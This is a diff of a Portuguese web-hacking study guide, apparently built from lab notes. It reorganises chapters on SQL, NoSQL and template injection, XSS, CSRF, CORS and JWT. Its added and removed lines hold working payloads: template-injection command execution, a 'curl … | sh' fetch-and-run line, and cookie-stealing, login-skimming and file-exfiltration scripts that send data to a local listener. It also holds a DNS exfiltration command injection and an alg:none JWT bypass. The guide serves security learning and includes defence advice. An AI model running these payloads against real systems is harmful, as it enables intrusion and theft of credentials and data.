@@ -1,202 +1,10 @@
 <!DOCTYPE html>
 
-<html lang="pt-BR"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="#050507" name="theme-color"/><meta content="Guia de Web Hacking com anotações de laboratório de s6msx." name="description"/><title>Web Hacking — s6msx</title><link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&amp;family=Space+Grotesk:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/><link href="styles.css" rel="stylesheet"/><link href="effects.css" rel="stylesheet"/><link href="pages.css" rel="stylesheet"/><link href="guide.css" rel="stylesheet"/></head><body><div aria-hidden="true" class="noise"></div><header class="site-header" id="topo"><a aria-label="s6msx, início" class="wordmark" href="index.html">s6msx<span class="spark">✦</span></a><nav aria-label="Navegação principal" class="desktop-nav"><a class="" href="index.html">INÍCIO</a><a class="" href="sobre.html">SOBRE</a><a class="" href="pesquisa.html">PESQUISA</a><a class="active" href="guia.html">GUIA</a><a href="projetos.html">PROJETOS</a><a class="" href="contato.html">CONTATO</a></nav><div class="header-end"><span class="status-dot"></span><span>SECURE SESSION ACTIVE</span></div><button aria-controls="mobile-nav" aria-expanded="false" aria-label="Abrir menu" class="menu-toggle" type="button"><span></span><span></span><span></span></button><nav aria-label="Navegação móvel" class="mobile-nav" hidden="" id="mobile-nav"><a href="index.html">Início</a><a href="sobre.html">Sobre</a><a href="pesquisa.html">Pesquisa</a><a href="guia.html">Guia</a><a href="projetos.html">Projetos</a><a href="contato.html">Contato</a></nav></header><main><section class="interior-hero guide-hero" style="--interior-image:url('eyes.png')"><div class="interior-hero-inner"><p class="eyebrow"><span class="accent-square"></span> HACKING FIELD GUIDE</p><h1>WEB HACKING<em>.</em></h1><p>Aplicações, APIs e falhas de entrada</p></div><span class="page-index mono">GUIDE / WEB</span></section><div class="guide-shell"><aside aria-label="Índice do capítulo" class="guide-toc"><strong>NESTE CAPÍTULO</strong><nav><a href="#fluxo">01 / Primeiro, entenda o fluxo</a><a href="#fuzzing">02 / Descoberta de rotas e parâmetros</a><a href="#injecao">03 / Injeção de comandos</a><a href="#sql">04 / SQL Injection</a><a href="#nosql">05 / NoSQL Injection</a><a href="#template">06 / SSTI e execução no servidor</a><a href="#navegador">07 / XSS, HTML e Markdown</a><a href="#sessao">08 / JWT, CSRF e CORS</a><a href="#outros">09 / Outras superfícies web</a><a href="#caderno">EXEMPLOS DO CADERNO</a></nav><a href="guia.html">← TODOS OS CAPÍTULOS</a></aside><article class="guide-article"><p class="guide-intro">Uma trilha para observar como uma aplicação recebe dados, toma decisões e devolve respostas. Comece pelo comportamento normal; depois compare cada entrada, método e contexto de execução.</p><div class="guide-context"><strong>NOTAS DE LABORATÓRIO.</strong> Conteúdo organizado a partir das suas anotações. Exemplos usam domínios e credenciais fictícios; as explicações adicionadas servem para dar contexto, corrigir sintaxe quando necessário e orientar a leitura.</div><section class="guide-section" id="fluxo"><span class="guide-label">FIELD NOTE</span><h2>01 / Primeiro, entenda o fluxo</h2><p>Busque pela documentação da API. Teste os métodos HTTP aceitos, os códigos de resposta, a autenticação e as diferenças entre usuário anônimo e autenticado. Registre a requisição original antes de alterar parâmetros.</p><p>Em GraphQL, a introspecção pode revelar tipos, campos e argumentos quando estiver habilitada. A consulta completa está nas notas originais; para uma primeira leitura, comece por <code>__schema</code> e <code>queryType</code>.</p><pre><code class="language-graphql">query { __schema { queryType { name } types { name } } }</code></pre><div class="guide-note">A documentação e a introspecção são pontos de partida. Não conclua que uma rota é vulnerável apenas por estar exposta.</div><figure class="guide-figure"><img alt="Diagrama do fluxo de uma requisição web, da entrada à resposta" loading="lazy" src="guide-assets/web-flow.svg"/><figcaption>Diagrama editorial: use cada etapa para formular hipóteses e registrar evidências.</figcaption></figure></section><section class="guide-section" id="fuzzing"><span class="guide-label">FIELD NOTE</span><h2>02 / Descoberta de rotas e parâmetros</h2><p>Podemos passar um arquivo para o ffuf para ele fazer os requests. Basta pegar a request, adicionar <code>FUZZ</code> onde queremos testar e comparar as respostas. Feroxbuster ajuda a descobrir diretórios e arquivos em aplicações de laboratório.</p><pre><code class="language-bash">ffuf -request req.txt -w wordlist.txt
-feroxbuster --url https://app.exemplo.test/ -w caminhos.txt -t 10 -C 400,500</code></pre><p>Observe tamanho, status e tempo de resposta. Ajuste a taxa para não derrubar o serviço durante um teste autorizado.</p></section><section class="guide-section" id="injecao"><span class="guide-label">FIELD NOTE</span><h2>03 / Injeção de comandos</h2><p>Os separadores <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, <code>;</code> e quebras de linha podem alterar a forma como um shell interpreta uma entrada. O contexto importa: aspas, filtros e a chamada real do programa mudam o resultado.</p><pre><code class="language-bash">valor; id
-valor &amp;&amp; whoami
-valor | wc -c</code></pre><div class="guide-note">Use comandos de observação em laboratório. Ao encontrar o ponto de entrada, documente o parâmetro e recomende execução sem shell, validação da entrada e privilégios mínimos.</div></section><section class="guide-section" id="sql"><span class="guide-label">FIELD NOTE</span><h2>04 / SQL Injection</h2><p>As notas cobrem descoberta por união, leitura do esquema e automação com sqlmap. A sequência útil é confirmar a diferença na resposta, identificar o banco, mapear tabelas e colunas relevantes e registrar o impacto com o mínimo de dados necessário.</p><pre><code class="language-bash">sqlmap -r req.txt --technique=BEUSTQ</code></pre><p><code>B</code> = boolean-based blind; <code>E</code> = error-based; <code>U</code> = UNION; <code>S</code> = stacked queries; <code>T</code> = time-based; <code>Q</code> = inline queries. A opção correta do sqlmap é <code>--technique</code> no singular.</p><p>As notas também mostram <code>information_schema</code>, <code>group_concat</code> e <code>LOAD_FILE</code>. Trate leitura de arquivos como impacto possível, dependente dos privilégios do banco e da configuração do servidor.</p><div class="guide-note">Defesa: consultas parametrizadas, privilégios mínimos para a conta do banco e mensagens de erro sem detalhes internos.</div></section><section class="guide-section" id="nosql"><span class="guide-label">FIELD NOTE</span><h2>05 / NoSQL Injection</h2><p>Em aplicações que constroem consultas a partir de objetos recebidos, operadores como <code>$regex</code> e <code>$ne</code> podem mudar a lógica esperada. As notas incluem testes de condições verdadeiras/falsas e referência ao NoSQLmap.</p><pre><code class="language-json">{"username":{"$regex":"admin.*"},"password":{"$ne":""}}</code></pre><p>Compare respostas e valide como o servidor transforma os tipos recebidos. Use esquemas de entrada que impeçam operadores inesperados.</p></section><section class="guide-section" id="template"><span class="guide-label">FIELD NOTE</span><h2>06 / SSTI e execução no servidor</h2><p>Server Side Template Injection acontece quando uma entrada é interpretada como expressão de template. As notas registram marcadores de diferentes mecanismos. Um teste inicial simples é verificar se uma expressão aritmética é avaliada.</p><pre><code class="language-text">{{7*7}}
-${7*7}
-{% 7 * 7 %}</code></pre><p>Não misture sintaxes: cada engine tem regras próprias. Se houver avaliação, identifique a engine e os objetos disponíveis antes de concluir o impacto. Nunca renderize entrada não confiável como template.</p><p>Em Node.js, as anotações também mostram leitura de arquivo com <code>fs</code> e execução via <code>child_process</code>. Esses trechos são exemplos de impacto após uma falha de execução, não etapas de descoberta.</p></section><section class="guide-section" id="navegador"><span class="guide-label">FIELD NOTE</span><h2>07 / XSS, HTML e Markdown</h2><p>As notas de XSS reúnem contextos HTML, atributo, URL, string JavaScript e Markdown. O mesmo texto não funciona em todos eles. Primeiro descubra onde a entrada aparece e qual codificação o navegador aplica.</p><pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
-&lt;a href="javascript:alert(1)"&gt;teste&lt;/a&gt;</code></pre><p>O arquivo original também incluía exemplos de envio de cookies e credenciais. No guia público, o teste de conceito usa um efeito visível local. Para demonstrar impacto, descreva o alcance sem coletar dados reais.</p><div class="guide-note">Defesa: escape conforme o contexto de saída, sanitização de HTML/Markdown, CSP e cookies HttpOnly quando cabível.</div></section><section class="guide-section" id="sessao"><span class="guide-label">FIELD NOTE</span><h2>08 / JWT, CSRF e CORS</h2><h3>JWT</h3><p>Uma das notas descreve a troca de <code>alg</code> por <code>none</code> em um laboratório com verificação defeituosa. O ponto final continua representando a assinatura vazia. Isso só funciona quando o servidor aceita indevidamente um token sem assinatura; a correção é fixar algoritmos permitidos no servidor e validar assinatura, emissor e audiência.</p><p>Há também referência ao modo 16500 do Hashcat para avaliar segredos JWT fracos em laboratório. Prefira chaves fortes e rotação controlada.</p><h3>CSRF</h3><p>O exemplo original envia um formulário de mudança de e-mail a partir de outra origem. Para revisar a proteção, verifique token anti-CSRF, cookies SameSite e confirmação da ação sensível.</p><h3>CORS</h3><p>As notas cobrem reflexão de <code>Origin</code> e origem <code>null</code>. Uma configuração permissiva com credenciais pode expor respostas a origens não confiáveis. Revise a lista de origens e o uso de <code>Access-Control-Allow-Credentials</code>.</p></section><section class="guide-section" id="outros"><span class="guide-label">FIELD NOTE</span><h2>09 / Outras superfícies web</h2><ul><li><strong>File Upload:</strong> validar tipo real, extensão, armazenamento e execução no servidor.</li><li><strong>Path Traversal:</strong> investigar normalização de caminhos e acesso fora do diretório esperado.</li><li><strong>HTTP Request Smuggling:</strong> divergência de parsing entre proxy e servidor.</li><li><strong>Insecure Deserialization:</strong> objetos não confiáveis recriados com efeitos inesperados.</li><li><strong>Prototype Pollution:</strong> chaves controladas que alteram protótipos JavaScript.</li><li><strong>Race Conditions:</strong> operações concorrentes que quebram invariantes de negócio.</li><li><strong>Remote Code Execution:</strong> impacto de uma falha, não uma categoria única de entrada.</li></ul><p>Essas páginas eram marcadores sem conteúdo no ZIP. Mantive o mapa de estudo e acrescentei apenas o contexto essencial, sem criar uma exploração que não estava nas suas notas.</p></section><section class="guide-section guide-source" id="caderno"><span class="guide-label">SOURCE / ORIGINAL NOTES</span><h2>Exemplos do caderno.</h2><p>Trechos preservados das anotações do ZIP. Endereços e credenciais de laboratórios foram substituídos por exemplos genéricos; comandos e observações permanecem organizados pelo capítulo.</p><details class="source-note" open=""><summary>API</summary><div class="source-note-body"><ul>
+<html lang="pt-BR"><head><meta charset="utf-8"/><meta content="width=device-width, initial-scale=1" name="viewport"/><meta content="#050507" name="theme-color"/><meta content="Guia de Web Hacking com técnicas, comandos e dicas práticas de s6msx." name="description"/><title>Web Hacking — s6msx</title><link href="favicon.svg" rel="icon" type="image/svg+xml"/><link href="https://fonts.googleapis.com" rel="preconnect"/><link crossorigin="" href="https://fonts.gstatic.com" rel="preconnect"/><link href="https://fonts.googleapis.com/css2?family=DM+Mono:wght@400;500&amp;family=Space+Grotesk:wght@400;500;600;700&amp;display=swap" rel="stylesheet"/><link href="styles.css" rel="stylesheet"/><link href="effects.css" rel="stylesheet"/><link href="pages.css" rel="stylesheet"/><link href="guide.css" rel="stylesheet"/></head><body><div aria-hidden="true" class="noise"></div><header class="site-header" id="topo"><a aria-label="s6msx, início" class="wordmark" href="index.html">s6msx<span class="spark">✦</span></a><nav aria-label="Navegação principal" class="desktop-nav"><a class="" href="index.html">INÍCIO</a><a class="" href="sobre.html">SOBRE</a><a class="" href="pesquisa.html">PESQUISA</a><a class="active" href="guia.html">GUIA</a><a href="projetos.html">PROJETOS</a><a class="" href="contato.html">CONTATO</a></nav><div class="header-end"><span class="status-dot"></span><span>SECURE SESSION ACTIVE</span></div><button aria-controls="mobile-nav" aria-expanded="false" aria-label="Abrir menu" class="menu-toggle" type="button"><span></span><span></span><span></span></button><nav aria-label="Navegação móvel" class="mobile-nav" hidden="" id="mobile-nav"><a href="index.html">Início</a><a href="sobre.html">Sobre</a><a href="pesquisa.html">Pesquisa</a><a href="guia.html">Guia</a><a href="projetos.html">Projetos</a><a href="contato.html">Contato</a></nav></header><main><section class="interior-hero guide-hero" style="--interior-image:url('eyes.png')"><div class="interior-hero-inner"><p class="eyebrow"><span class="accent-square"></span> HACKING FIELD GUIDE</p><h1>WEB HACKING<em>.</em></h1><p>Aplicações, APIs e falhas de entrada</p></div><span class="page-index mono">GUIDE / WEB</span></section><div class="guide-shell"><aside aria-label="Índice do capítulo" class="guide-toc"><strong>NESTE CAPÍTULO</strong><nav><a href="#fluxo">01 / Primeiro, entenda o fluxo</a><a href="#fuzzing">02 / Descoberta de rotas e parâmetros</a><a href="#injecao">03 / Injeção de comandos</a><a href="#sql">04 / SQL Injection</a><a href="#nosql">05 / NoSQL Injection</a><a href="#template">06 / SSTI e execução no servidor</a><a href="#navegador">07 / XSS, HTML e Markdown</a><a href="#sessao">08 / JWT, CSRF e CORS</a><a href="#outros">09 / Outras superfícies web</a></nav><a href="guia.html">← TODOS OS CAPÍTULOS</a></aside><article class="guide-article"><p class="guide-intro">Uma trilha para observar como uma aplicação recebe dados, toma decisões e devolve respostas. Comece pelo comportamento normal; depois compare cada entrada, método e contexto de execução.</p><div class="guide-context"><strong>USO RÁPIDO.</strong> Defina o escopo, substitua os endereços pelos do laboratório e compare as respostas antes de avançar. Registre comando, resultado e evidência.</div><section class="guide-section" id="fluxo"><span class="guide-label">TIPS / TRICKS</span><h2>01 / Primeiro, entenda o fluxo</h2><p>Procure a documentação da API. Compare métodos HTTP, códigos de resposta, autenticação e diferenças entre acessos anônimos e autenticados. Salve uma requisição válida antes de alterar parâmetros.</p><p>Em GraphQL, comece pela introspecção: <code>__schema</code> mostra tipos, campos e argumentos quando esse recurso está habilitado. A consulta completa está logo abaixo, em “Full introspect query”.</p><pre><code class="language-graphql">query { __schema { queryType { name } types { name } } }</code></pre><div class="guide-note">A documentação e a introspecção são pontos de partida. Não conclua que uma rota é vulnerável apenas por estar exposta.</div><figure class="guide-figure"><img alt="Diagrama do fluxo de uma requisição web, da entrada à resposta" loading="lazy" src="guide-assets/web-flow.svg"/><figcaption>Fluxo de teste: entrada → aplicação → resposta. Observe onde o dado muda de contexto.</figcaption></figure><details class="source-note" open=""><summary>Checklist de API</summary><div class="source-note-body"><ul>
 <li>Busque pela documentação da API</li>
 <li>Teste todos os métodos HTTP</li>
 </ul>
-</div></details><details class="source-note" open=""><summary>Command Injection</summary><div class="source-note-body"><ul>
-<li>principais</li>
-</ul>
-<pre><code class="language-bash">&amp;
-&amp;&amp;
-|
-||
-;
-0x0a
-\n
-`command`
-</code></pre>
-<ul>
-<li>payloads</li>
-</ul>
-<pre><code class="language-bash">|| nslookup `whoami`.dadadadadadadada.com||
-</code></pre>
-</div></details><details class="source-note" open=""><summary>Server Side Template Injection</summary><div class="source-note-body"><pre><code class="language-bash">{{ ''.class.mro[1].subclasses() }}
-{{ ''.class.mro[1].subclasses()[84]().load_module('os').popen('id').read() }}
-
-{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
-
-&lt;% import os; test=os.popen('id').read() %&gt;${test}
-${self.module.cache.util.os.popen("id").read()}
-
-{% 7 * 7 %}
-{{7*7}}
-${7*7}
-</code></pre>
-</div></details><details class="source-note" open=""><summary>SQL Injection</summary><div class="source-note-body"><p>group concat infomation schema</p>
-<pre><code class="language-bash"># visualizar bancos de dados
-'union select group_concat(schema_name) from information_schema.schemata -- -
-
-# listar tabelas e colunas
-'union select group_concat(TABLE_NAME, ":",COLUMN_NAME, "\n") from information_schema.columns where TABLE_SCHEMA like 'database_name'
-
-# ver conteudo
-'union select group_concat(column_name, "\n") from database_name.table_name -- -
-</code></pre>
-<p>ler arquivos</p>
-<pre><code class="language-bash">union select LOAD_FILE('/var/www/html/index.php')-- -
-</code></pre>
-</div></details><details class="source-note" open=""><summary>NoSQLi</summary><div class="source-note-body"><pre><code class="language-bash">'||1||'
-</code></pre>
-<pre><code class="language-bash">{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
-</code></pre>
-<pre><code class="language-bash">/?user=wiener' &amp;&amp; '1'=='2'
-/?user=wiener' &amp;&amp; '1'=='1'
-
-/?user=administrator' &amp;&amp; this.password.length &lt; 10 || 'a' == 'b'
-/?user=administrator' &amp;&amp; this.password[0] == 'a
-
-</code></pre>
-</div></details><details class="source-note" open=""><summary>CSRF</summary><div class="source-note-body"><ul>
-<li>common code</li>
-</ul>
-<pre><code class="language-html">&lt;html&gt;
-    &lt;body&gt;
-        &lt;form action="https://app.exemplo.test/email/change" method="POST"&gt;
-            &lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt;
-        &lt;/form&gt;
-        &lt;script&gt;
-            document.forms[0].submit();
-        &lt;/script&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-</div></details><details class="source-note" open=""><summary>CORS</summary><div class="source-note-body"><p>CORS vulnerability with basic origin reflection</p>
-<pre><code class="language-html">        &lt;script&gt;
-            var xhr = new XMLHttpRequest();
-            var url = "https://app.exemplo.test"
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == XMLHttpRequest.DONE){
-                    fetch("/log?key=" + xhr.responseText)
-                }
-            }
-
-            xhr.open('GET', url + "/accountDetails", true);
-            xhr.withCredentials = true;
-            xhr.send(null)
-        &lt;/script&gt;
-</code></pre>
-<ul>
-<li>cors null origin</li>
-</ul>
-<pre><code class="language-bash">&lt;html&gt;
-    &lt;body&gt;
-        &lt;iframe style="display: none;" sandbox="allow-scripts" srcdoc="
-        &lt;script&gt;
-            var xhr = new XMLHttpRequest();
-            var url = 'https://app.exemplo.test'
-
-            xhr.onreadystatechange = function() {
-                if (xhr.readyState == XMLHttpRequest.DONE) {
-                    fetch('http://127.0.0.1:5555/log?key=' + xhr.responseText)
-                }
-            }
-
-            xhr.open('GET', url + '/accountDetails', true);
-            xhr.withCredentials = true;
-            xhr.send(null);
-        &lt;/script&gt;"&gt;&lt;/iframe&gt;
-    &lt;/body&gt;
-&lt;/html&gt;
-</code></pre>
-</div></details><details class="source-note" open=""><summary>Node Js</summary><div class="source-note-body"><p>Read file</p>
-<pre><code class="language-jsx">require('fs').readFileSync('./flag.txt').toString();
-</code></pre>
-<p>Execute command</p>
-<pre><code class="language-python">_$$ND_FUNC$$_function (){require('child_process').execSync('curl http://127.0.0.1:8000/shell.sh | sh').toString();
-</code></pre>
-</div></details><details class="source-note" open=""><summary>SQLmap commands</summary><div class="source-note-body"><h3>Technics</h3>
-<pre><code class="language-bash">ex: sqlmap -r req.txt --technics=BEUSTQ
-</code></pre>
-<ul>
-<li>B: Boolean-based blind</li>
-<li>E: Error-based</li>
-<li>U: Union query-based</li>
-<li>S: Stacked queries</li>
-<li>T: Time-based blind</li>
-<li>Q: Inline queries</li>
-</ul>
-</div></details><details class="source-note" open=""><summary>Comandos - easy</summary><div class="source-note-body"><ul>
-<li>Roubo de cookies:</li>
-</ul>
-<pre><code class="language-jsx">i&lt;img src=x onerror=fetch('http://127.0.0.1:8000/'+ document.cookie);&gt;
-</code></pre>
-<ul>
-<li>Executar codigo javascript a partir de um arquivo:</li>
-</ul>
-<pre><code class="language-jsx">&lt;img src=x onerror="var script1=document.createElement('script');script1.src='http://127.0.0.1:8000/payload.js';document.head.appendChild(script1);"/&gt;
-</code></pre>
-<pre><code class="language-html">&lt;iframe src="https://app.exemplo.test/#" onload="this.src+='&lt;img src=x onerror=print()&gt;'"&gt;&lt;/iframe&gt;
-</code></pre>
-<ul>
-<li>HTML-encoded bypass</li>
-</ul>
-<pre><code class="language-bash">"onmouseover="alert(1)
-
-#href parameter
-javascript:alert(1)
-</code></pre>
-<ul>
-<li>Reflected XSS into a JavaScript string with angle brackets HTML encoded</li>
-</ul>
-<pre><code class="language-bash">'-alert(1)-'
-</code></pre>
-<ul>
-<li>Get credentials</li>
-</ul>
-<pre><code class="language-bash">document.addEventListener('DOMContentLoaded', function () {
-    const form = document.querySelector('.login-form');
-    if (!form) return;
-
-    form.addEventListener('submit', function (e) {
-        const u = document.querySelector('#username').value;
-        const p = document.querySelector('#password').value;
-        navigator.sendBeacon('http://127.0.0.1:8000/', new URLSearchParams({ u, p }));
-    });
-});
-</code></pre>
-</div></details><details class="source-note" open=""><summary>Markdown XSS</summary><div class="source-note-body"><ul>
-<li>LFI with markdown xss example:</li>
-</ul>
-<pre><code class="language-jsx">&lt;script&gt;
-fetch("http://vulnerable-site/view.php?file=../../../../etc/passwd")
-.then(response =&gt; response.text())
-.then(data =&gt; {
-fetch("http://127.0.0.1:8000/?file_content=" + encodeURIComponent(data));
-});
-&lt;/script&gt;
-</code></pre>
-</div></details><details class="source-note" open=""><summary>JWT authentication bypass via flawed signature ver</summary><div class="source-note-body"><p>para explorar essa vulnerabilidade, precisamos mudar o paramentro “alg” para none.</p>
-<p>lembre-se tbm de remover a assinatura do token.</p>
-<p>token com “alg: none” mas ainda com a assinatura:</p>
-<pre><code class="language-bash">eyJraWQiOiJkMzFhNWVjYy00YTcwLTQ1NTAtYTNkZC1jZDRlNTBjOTc5MzciLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzAwNTcxNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.j1z5PNj4UeduLuIWOpep2FtGsXrH9yNxXkioeXf3CrTHRwCYHhKKgQb88PVfWcJ7b5hVbnODWioFr346eOGZDZukg2CHYNe0VwDfjdfd4VNo9w3oDl0xICptGYSlpZvSdOp1A4raT-5iwvRTDp5-xdhfHSBdU5StqYqwt9uJCiHYbWksmW5k6UgyPF_pG62Y_AqyZ5YXhO40hzHg6azcBgBDXq73ES7qGyLHRzG7YU3Y78xl1k6uDlfkcjW-I5VMjJBhGKBvmsUfo4w6ZXkW_0CjuzZ2cxA9cxGAAcPl1k2EWR1UaXoPKavc_wkPBOWAS2GQZw9ng446YKg3idX6gA
-</code></pre>
-<p>token pronto para o bypass: (alg : none e sem a assinatura):</p>
-<pre><code class="language-bash">eyJraWQiOiJkMzFhNWVjYy00YTcwLTQ1NTAtYTNkZC1jZDRlNTBjOTc5MzciLCJhbGciOiJub25lIn0%3d.eyJpc3MiOiJwb3J0c3dpZ2dlciIsImV4cCI6MTcxNzAwNTcxNSwic3ViIjoiYWRtaW5pc3RyYXRvciJ9.
-</code></pre>
-<p>mesmo o algoritimo sendo definido como none. precisa do  ponto “.” no final do token.</p>
-</div></details><details class="source-note" open=""><summary>Brute-force secret keys</summary><div class="source-note-body"><ul>
-<li>hashcat</li>
-</ul>
-<pre><code class="language-bash">hashcat -a 0 -m 16500 &lt;jwt&gt; &lt;wordlist&gt;
-</code></pre>
-</div></details><details class="source-note" open=""><summary>Full instrospect query</summary><div class="source-note-body"><pre><code class="language-graphql">query IntrospectionQuery {
+</div></details><details class="source-note" open=""><summary>Consulta completa de introspecção</summary><div class="source-note-body"><pre><code class="language-graphql">query IntrospectionQuery {
         __schema {
             queryType {
                 name
@@ -279,5 +87,197 @@ fetch("http://127.0.0.1:8000/?file_content=" + encodeURIComponent(data));
             }
         }
     }
+</code></pre>
+</div></details></section><section class="guide-section" id="fuzzing"><span class="guide-label">TIPS / TRICKS</span><h2>02 / Descoberta de rotas e parâmetros</h2><p>Podemos passar um arquivo para o ffuf para ele fazer os requests. Basta pegar a request, adicionar <code>FUZZ</code> onde queremos testar e comparar as respostas. Feroxbuster ajuda a descobrir diretórios e arquivos em aplicações de laboratório.</p><pre><code class="language-bash">ffuf -request req.txt -w wordlist.txt
+feroxbuster --url https://app.exemplo.test/ -w caminhos.txt -t 10 -C 400,500</code></pre><p>Observe tamanho, status e tempo de resposta. Ajuste a taxa para não derrubar o serviço durante um teste autorizado.</p></section><section class="guide-section" id="injecao"><span class="guide-label">TIPS / TRICKS</span><h2>03 / Injeção de comandos</h2><p>Os separadores <code>&amp;</code>, <code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, <code>;</code> e quebras de linha podem alterar a forma como um shell interpreta uma entrada. O contexto importa: aspas, filtros e a chamada real do programa mudam o resultado.</p><pre><code class="language-bash">valor; id
+valor &amp;&amp; whoami
+valor | wc -c</code></pre><div class="guide-note">Use comandos de observação em laboratório. Ao encontrar o ponto de entrada, documente o parâmetro e recomende execução sem shell, validação da entrada e privilégios mínimos.</div><details class="source-note" open=""><summary>Separadores de comandos</summary><div class="source-note-body"><ul>
+<li>principais</li>
+</ul>
+<pre><code class="language-bash">&amp;
+&amp;&amp;
+|
+||
+;
+0x0a
+\n
+`command`
+</code></pre>
+<ul>
+<li>payloads</li>
+</ul>
+<pre><code class="language-bash">|| nslookup `whoami`.dadadadadadadada.com||
+</code></pre>
+</div></details></section><section class="guide-section" id="sql"><span class="guide-label">TIPS / TRICKS</span><h2>04 / SQL Injection</h2><p>Confirme a mudança de resposta, identifique o banco, mapeie tabelas e colunas relevantes e demonstre o impacto com o mínimo de dados necessário. Para acelerar a validação, use o <code>sqlmap</code> com uma requisição salva.</p><pre><code class="language-bash">sqlmap -r req.txt --technique=BEUSTQ</code></pre><p><code>B</code> = boolean-based blind; <code>E</code> = error-based; <code>U</code> = UNION; <code>S</code> = stacked queries; <code>T</code> = time-based; <code>Q</code> = inline queries. A opção correta do sqlmap é <code>--technique</code> no singular.</p><p><code>information_schema</code> ajuda a mapear o esquema; <code>group_concat</code> agrega resultados. <code>LOAD_FILE</code> só funciona quando a conta do banco e a configuração permitem leitura de arquivos.</p><div class="guide-note">Defesa: consultas parametrizadas, privilégios mínimos para a conta do banco e mensagens de erro sem detalhes internos.</div><details class="source-note" open=""><summary>UNION e leitura do esquema</summary><div class="source-note-body"><p>group concat infomation schema</p>
+<pre><code class="language-bash"># visualizar bancos de dados
+'union select group_concat(schema_name) from information_schema.schemata -- -
+
+# listar tabelas e colunas
+'union select group_concat(TABLE_NAME, ":",COLUMN_NAME, "\n") from information_schema.columns where TABLE_SCHEMA like 'database_name'
+
+# ver conteudo
+'union select group_concat(column_name, "\n") from database_name.table_name -- -
+</code></pre>
+<p>ler arquivos</p>
+<pre><code class="language-bash">union select LOAD_FILE('/var/www/html/index.php')-- -
+</code></pre>
+</div></details><details class="source-note" open=""><summary>Técnicas do sqlmap</summary><div class="source-note-body"><h3>Technics</h3>
+<pre><code class="language-bash">ex: sqlmap -r req.txt --technics=BEUSTQ
+</code></pre>
+<ul>
+<li>B: Boolean-based blind</li>
+<li>E: Error-based</li>
+<li>U: Union query-based</li>
+<li>S: Stacked queries</li>
+<li>T: Time-based blind</li>
+<li>Q: Inline queries</li>
+</ul>
+</div></details></section><section class="guide-section" id="nosql"><span class="guide-label">TIPS / TRICKS</span><h2>05 / NoSQL Injection</h2><p>Se a aplicação transforma JSON recebido em consulta, operadores como <code>$regex</code> e <code>$ne</code> podem alterar a lógica. Compare uma condição verdadeira com outra falsa e observe diferenças de resposta. O NoSQLmap é uma opção para automatizar parte dos testes.</p><pre><code class="language-json">{"username":{"$regex":"admin.*"},"password":{"$ne":""}}</code></pre><p>Compare respostas e valide como o servidor transforma os tipos recebidos. Use esquemas de entrada que impeçam operadores inesperados.</p><details class="source-note" open=""><summary>Operadores e condições</summary><div class="source-note-body"><pre><code class="language-bash">'||1||'
+</code></pre>
+<pre><code class="language-bash">{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
+</code></pre>
+<pre><code class="language-bash">/?user=wiener' &amp;&amp; '1'=='2'
+/?user=wiener' &amp;&amp; '1'=='1'
+
+/?user=administrator' &amp;&amp; this.password.length &lt; 10 || 'a' == 'b'
+/?user=administrator' &amp;&amp; this.password[0] == 'a
+
+</code></pre>
+</div></details></section><section class="guide-section" id="template"><span class="guide-label">TIPS / TRICKS</span><h2>06 / SSTI e execução no servidor</h2><p>SSTI ocorre quando a entrada é avaliada pelo mecanismo de templates. Comece com uma expressão aritmética simples; se ela for calculada, identifique a engine antes de testar outros objetos.</p><pre><code class="language-text">{{7*7}}
+${7*7}
+{% 7 * 7 %}</code></pre><p>Não misture sintaxes: cada engine tem regras próprias. Se houver avaliação, identifique a engine e os objetos disponíveis antes de concluir o impacto. Nunca renderize entrada não confiável como template.</p><p>Em Node.js, <code>fs</code> permite ler arquivos e <code>child_process</code> executa processos. Esses recursos ajudam a medir o impacto quando uma falha já oferece execução de código.</p><details class="source-note" open=""><summary>Sintaxes de template</summary><div class="source-note-body"><pre><code class="language-bash">{{ ''.class.mro[1].subclasses() }}
+{{ ''.class.mro[1].subclasses()[84]().load_module('os').popen('id').read() }}
+
+{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
+
+&lt;% import os; test=os.popen('id').read() %&gt;${test}
+${self.module.cache.util.os.popen("id").read()}
+
+{% 7 * 7 %}
+{{7*7}}
+${7*7}
+</code></pre>
+</div></details></section><section class="guide-section" id="navegador"><span class="guide-label">TIPS / TRICKS</span><h2>07 / XSS, HTML e Markdown</h2><p>Em XSS, descubra primeiro o contexto da reflexão: HTML, atributo, URL, string JavaScript ou Markdown. O payload depende do ponto exato em que a entrada aparece e da codificação aplicada.</p><pre><code class="language-html">&lt;img src=x onerror=alert(1)&gt;
+&lt;a href="javascript:alert(1)"&gt;teste&lt;/a&gt;</code></pre><p>Para uma prova de conceito inicial, use um efeito visível no próprio navegador, como <code>alert(1)</code> ou <code>print()</code>. Depois descreva o impacto possível e os dados acessíveis naquele contexto.</p><div class="guide-note">Defesa: escape conforme o contexto de saída, sanitização de HTML/Markdown, CSP e cookies HttpOnly quando cabível.</div><details class="source-note" open=""><summary>Payloads XSS por contexto</summary><div class="source-note-body"><ul>
+<li>Roubo de cookies:</li>
+</ul>
